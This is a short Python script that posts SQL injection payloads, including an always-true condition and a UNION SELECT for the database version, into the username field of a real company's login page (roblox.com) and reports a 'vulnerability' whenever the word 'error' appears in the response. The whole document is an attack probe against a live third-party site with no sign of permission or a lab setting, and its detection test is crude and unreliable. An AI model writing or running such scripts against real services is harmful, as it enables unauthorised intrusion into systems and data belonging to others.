import requests

# Target URL
url = 'http://www.roblox.com/login'

# List of SQL injection test payloads
payloads = [
    "' OR '1'='1",          # Simple SQL injection
    "' OR 1=1 --",          # Ends the SQL command to see if the rest is executed
    "' UNION SELECT 1, @@version --" # Tries to get database version
]

# Testing each payload
for payload in payloads:
    response = requests.post(url, data={'username': payload, 'password': 'password'})
    if "error" in response.text:
        print(f"Vulnerability detected with payload: {payload}")
    else:
        print("No vulnerability detected with this payload.")
